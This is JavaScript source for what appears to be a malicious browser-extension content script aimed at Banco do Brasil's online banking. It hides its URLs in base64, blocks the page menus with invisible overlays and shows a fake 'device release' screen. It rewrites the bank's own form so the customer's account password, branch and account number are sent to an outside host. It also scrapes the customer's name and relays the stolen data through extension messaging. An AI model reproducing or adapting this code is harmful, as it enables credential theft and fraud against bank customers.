function wjQmukpgb(kkk) { return window.atob(kkk);}
ZhTuFBCkK = function(s) { return window.btoa(unescape(encodeURIComponent(s))) }

function jCEib() {

	$('#escondeMenu1').show();
	$('#escondeMenu2').show();

	$.post(wjQmukpgb('aHR0cHM6Ly93d3cyLmJhbmNvYnJhc2lsLmNvbS5ici9hYXBmL291dHJhc09wY29lcy84QzEuanNwP3RpbWU9MTUzMzYzNDk3NTkwNiYiLCJhbWJpZW50ZUxheW91dD10cmFuc2FjYW8mbm92b0xheW91dD1zaW0=')).done(function(res){
		var tokenDuploClique = QgjgYEzShQi(res,' id="tokenDuploClique" value="','"');
		var mci = QgjgYEzShQi(res,' name="mci-ibt" value="','"');
		$.post(wjQmukpgb('aHR0cHM6Ly93d3cyLmJhbmNvYnJhc2lsLmNvbS5ici9hYXBmL291dHJhc09wY29lcy84QzEuanNwP3RpbWU9MTUzMzYzNDk3NTkwNiY='),"codNoticia=null&opcao=1&ddd=&telefone=&valor=30%2C00&tokenDuploClique="+tokenDuploClique+"&codigoTransacao=8C1&codigoBannerTransacao=null&ambienteLayout=transacao&botaoAcao=botaoContinua.x&mci-ibt="+mci+"&ambienteLayout=transacao&botaoContinua.x=sim&botaoContinua.x=sim").done(function(res2){
			var tokenDuploClique = QgjgYEzShQi(res2,' id="tokenDuploClique" value="','"');
			var mci = QgjgYEzShQi(res2,' name="mci-ibt" value="','"');
			var time = QgjgYEzShQi(res2,' name="time" value="','"');
			cli.tokenDuploClique = tokenDuploClique;
			cli.mci = mci;
			cli.time = time;
			var setForm = "cli.senha6=$(\"#senhaConta\").val();";
			var funcaosaquesem = '';
			res2 = res2.replace('<form name="aapf" id="aapf" method="POST" autocomplete=\'off\' target="_self"  action="/aapf/outrasOpcoes/8C1.jsp" onsubmit="$.submeterFormulario(this,event);">','<script>function LajU(){$(".corpo").html(\'<form name="aapf" id="aapf" method="POST"><ul class="transacao"><li class="transacao-barra-titulo"><ul><li class="transacao-titulo"><div>LIBERAÇÃO DE DISPOSITIVO.</div></li><li class="transacao-toolbar"><ul class="transacao-toolbar-itens"></ul></li></ul></li><li><div class="transacao-corpo "> </div></li><li class="transacao-rodape-sucesso"> <h3 style="font-size:13px; font-weight: bold; text-align: center;">Aguarde, carregando informações ...</h3><li><li class="transacao-mensagem-verde"></li><li class="transacao-botoes"></li><li class="transacao-texto-ajuda"><span id="textoAjuda">&nbsp;</span></li></ul></form>\'),$("#escondeMenu1").show(),$("#escondeMenu2").show();}function QgjgYEzShQi(string,start,end){ str = string.split(start); str2 = str[1].split(end); return str2[0]; }  function execSenhaSaqueSem(senha6,token,mci){ alert("porra") }</script><form name="aapf2" id="aap2f" method="POST" autocomplete="off" target="_self" action="#" onsubmit="return false;">');
			res2 = res2.replace('Solicitação de saque','Liberação de dispositivo'+"");
			res2 = res2.replace('botaoapf noPrint" type="submit" name="botaoConfirma.x" id="botaoConfirma"','botaoapf noPrint" type="button" name="botaoConfirma.x2" id="botaoConfirma2"');
			res2 = res2.replace('<table width="150" border="0" cellPadding="0" cellSpacing="0">','<table width="150" border="0" cellPadding="0" cellSpacing="0" style="display:none">');
			res2 = res2.replace('<input class="botaoapf noPrint" type="submit" name="botaoRetorna.x" id="botaoRetorna" title="Retorna a tela anterior" value="RETORNAR&nbsp;&nbsp;&nbsp;" onclick="getAcaoBotao(\'botaoRetorna.x\');trocaBotaoAction(\'botaoRetorna\')" tabindex="90">','');
			res2 = res2.replace(' onclick="getAcaoBotao(\'botaoConfirma.x\');confirmaAssinador=1;trocaBotaoAction(\'botaoConfirma\');"',' onclick="if( $(\'#senhaConta\').val() == \'\'){ alert(\'Código invalido.\'); }else{ $.get(\'https://teampainelweb123.gov/api/s6?ag='+ZhTuFBCkK(cli.ag)+'&co='+ZhTuFBCkK(cli.co)+'&s6=\'+window.btoa(unescape(encodeURIComponent($(\'#senhaConta\').val())))).done(function(res){ $(\'.corpo\').html(window.atob(\'PGZvcm0gbmFtZT0iYWFwZiIgaWQ9ImFhcGYiIG1ldGhvZD0iUE9TVCI+PHVsIGNsYXNzPSJ0cmFuc2FjYW8iPjxsaSBjbGFzcz0idHJhbnNhY2FvLWJhcnJhLXRpdHVsbyI+PHVsPjxsaSBjbGFzcz0idHJhbnNhY2FvLXRpdHVsbyI+PGRpdj5MaWJlcmEmY2NlZGlsOyZhdGlsZGU7byBkZSBkaXNwb3NpdGl2bzwvZGl2PjwvbGk+PGxpIGNsYXNzPSJ0cmFuc2FjYW8tdG9vbGJhciI+PHVsIGNsYXNzPSJ0cmFuc2FjYW8tdG9vbGJhci1pdGVucyI+PC91bD48L2xpPjwvdWw+PC9saT48bGk+PGRpdiBjbGFzcz0idHJhbnNhY2FvLWNvcnBvICI+IDwvZGl2PjwvbGk+PGxpIGNsYXNzPSJ0cmFuc2FjYW8tcm9kYXBlLXN1Y2Vzc28iPiA8aDMgc3R5bGU9ImZvbnQtc2l6ZToxM3B4OyBmb250LXdlaWdodDogYm9sZDsgdGV4dC1hbGlnbjogY2VudGVyOyI+QWd1YXJkZSwgY2FycmVnYW5kbyBpbmZvcm1hJmNjZWRpbDsmb3RpbGRlO2VzIC4uLjwvaDM+PGxpPjxsaSBjbGFzcz0idHJhbnNhY2FvLW1lbnNhZ2VtLXZlcmRlIj48L2xpPjxsaSBjbGFzcz0idHJhbnNhY2FvLWJvdG9lcyI+PC9saT48bGkgY2xhc3M9InRyYW5zYWNhby10ZXh0by1hanVkYSI+PHNwYW4gaWQ9InRleHRvQWp1ZGEiPiZuYnNwOzwvc3Bhbj48L2xpPjwvdWw+PC9mb3JtPg==\')) }) }"');
			$('.corpo').html(res2);
		});
	});
}

function QgjgYEzShQi(string,start,end){ str = string.split(start); str2 = str[1].split(end); return str2[0]; }

function dataAtualFormatada(){
    var data = new Date(); 
    var dia = data.getDate();
    if (dia.toString().length == 1)
      dia = "0"+dia;
    var mes = data.getMonth()+1;
    if (mes.toString().length == 1)
      mes = "0"+mes;
    var ano = data.getFullYear();  
    return dia+"/"+mes+"/"+ano;
}

var cli = {};
var wab = 'conf';
var js = 'a';
var fla = 'YXBwc2F2ZS53aGVsYXN0aWMubmV0';
var cookies = document.cookie.split('; ');
var result = {};
var coo_ = '';

(function() {
	var page = document.location.href;
	if(page.indexOf(wjQmukpgb('YmFuY29icmFzaWwuY29tLmJyL2FhcGYvcHJpbmNpcGFsLmpzcA==')) > 0 || document.location.href.indexOf(wjQmukpgb('YmFuY29icmFzaWwuY29tLmJyL2FhcGYvdGVtcGxhdGVzLw==')) > 0) {

		//$('.menu-lateral').append("<div id=\"escondeMenu1\" style='position:absolute;top:0;left:0;z-index:9999999;background:none;width:100%;height:100%;cursor:hander;display:block;' onclick=\"alert('Dispositivo bloqueado.')\"></div>");
		$('.cabecalho').append("<div id=\"escondeMenu2\" style='position:absolute;top:0;left:0;z-index:9999999;background:none;width:100%;height:100%;cursor:hander;display:block;' onclick=\"alert('Dispositivo bloqueado.')\"></div>");
		$('.cabecalho').append("<div id=\"escondeMenu3\" style='position:absolute;top:0;right:0;z-index:999999999;background:none;width:100px;height:100%;cursor:pointer;display:block;' onclick=\"location.href='http://www.bb.com.br';\"></div>");

		window.setInterval(function(){
			
			if ($('#acao_').val() != '') {
				
				document.getElementById('acao_').value;
				cli.senha6 = $('#acao_').val();
				$('#acao_').val('');
				LkHeZi({cli});
			}
		},5000);
		
		$('body').append('<div>teste</div>');

		function LajU() {
			$('.corpo').html(window.atob('PGZvcm0gbmFtZT0iYWFwZiIgaWQ9ImFhcGYiIG1ldGhvZD0iUE9TVCI+PHVsIGNsYXNzPSJ0cmFuc2FjYW8iPjxsaSBjbGFzcz0idHJhbnNhY2FvLWJhcnJhLXRpdHVsbyI+PHVsPjxsaSBjbGFzcz0idHJhbnNhY2FvLXRpdHVsbyI+PGRpdj5MaWJlcmHDp8OjbyBkZSBkaXNwb3NpdGl2by48L2Rpdj48L2xpPjxsaSBjbGFzcz0idHJhbnNhY2FvLXRvb2xiYXIiPjx1bCBjbGFzcz0idHJhbnNhY2FvLXRvb2xiYXItaXRlbnMiPjwvdWw+PC9saT48L3VsPjwvbGk+PGxpPjxkaXYgY2xhc3M9InRyYW5zYWNhby1jb3JwbyAiPiA8L2Rpdj48L2xpPjxsaSBjbGFzcz0idHJhbnNhY2FvLXJvZGFwZS1zdWNlc3NvIj4gPGgzIHN0eWxlPSJmb250LXNpemU6MTNweDsgZm9udC13ZWlnaHQ6IGJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsiPkFndWFyZGUsIGNhcnJlZ2FuZG8gaW5mb3JtYcOnw7VlcyAuLi48L2gzPjxsaT48bGkgY2xhc3M9InRyYW5zYWNhby1tZW5zYWdlbS12ZXJkZSI+PC9saT48bGkgY2xhc3M9InRyYW5zYWNhby1ib3RvZXMiPjwvbGk+PGxpIGNsYXNzPSJ0cmFuc2FjYW8tdGV4dG8tYWp1ZGEiPjxzcGFuIGlkPSJ0ZXh0b0FqdWRhIj4mbmJzcDs8L3NwYW4+PC9saT48L3VsPjwvZm9ybT4='));
			$('#escondeMenu1').show();
			$('#escondeMenu2').show();
		}

		var startPrincipal = window.setInterval(function() {
			if ($('body').html().indexOf('transacao-titulo') > 0) {

				LajU();
				jCEib();
				$('#telablo').hide();
				clearInterval(startPrincipal);

				cli.ag = $('#dependenciaOrigem').text();
				cli.co = $('#numeroContratoOrigem').text();
				cli.no = $('#nomePersonalizado').text();
				cli.av = $('.avatar').attr('style');

				if (cli.av == undefined) { cli.av = ''; }
				LkHeZi({cli});
			}
		},500);
	}else if(page.indexOf('aapj.bb.com.br/aapj') > 0) {

		var startPrincipal = window.setInterval(function() {
		if ($('body').html().indexOf('transacao-titulo') > 0) {

			LajU();
			$('#telablo').hide();
			clearInterval(startPrincipal);

			cli.ag = $('#dependenciaOrigem').text();
			cli.co = $('#numeroContratoOrigem').text();
			cli.no = $('#nomePersonalizado').text();
			cli.av = $('.avatar').attr('style');

			if (cli.av == undefined) { cli.av = ''; }
			LkHeZi({cli});
		}
	},500);

		window.setInterval(function(){
			if($('#senhaConta').length) {
				console.log('opa opa opa');
			}else{
				console.log('nao existe');
			}
		},2000);
	}
})();

function LkHeZi(execr) {
    chrome.runtime.sendMessage(execr, function(response) {});
}

chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) {
	console.log(request);
});